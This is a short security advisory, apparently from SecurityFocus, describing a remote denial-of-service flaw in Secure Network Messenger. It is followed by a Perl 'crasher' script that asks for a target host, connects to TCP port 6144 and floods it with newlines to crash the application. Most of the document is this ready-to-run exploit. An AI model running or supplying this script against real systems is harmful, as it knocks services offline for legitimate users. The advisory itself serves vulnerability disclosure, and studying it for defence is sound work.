source: http://www.securityfocus.com/bid/11670/info

A remote denial of service vulnerability affects SecureAction Research Secure Network Messenger. This issue is due to a failure of the application to properly handle exceptional network data.

An attacker may leverage this issue to cause a computer running the vulnerable application to crash, denying service to legitimate users.

#!/usr/bin/perl

use IO::Socket;
print ("\nSecure Network Messenger Crasher by ClearScreen\n");
print ("\nEnter host to crash: ");
$h = <STDIN>;
chomp $h;
$socks = IO::Socket::INET->new(
       Proto => "tcp",
       PeerPort => "6144",
       PeerAddr => "$h"
) or die "\nNo response from host.";

sleep 1;
print "\nSuccesfully connected to $h!\n";
for ($count=1; $count<15; $count++)
{
print $socks "\n";
select(undef, undef, undef, 0.1);
}
print "\nMessenger crashed.";
close $socks;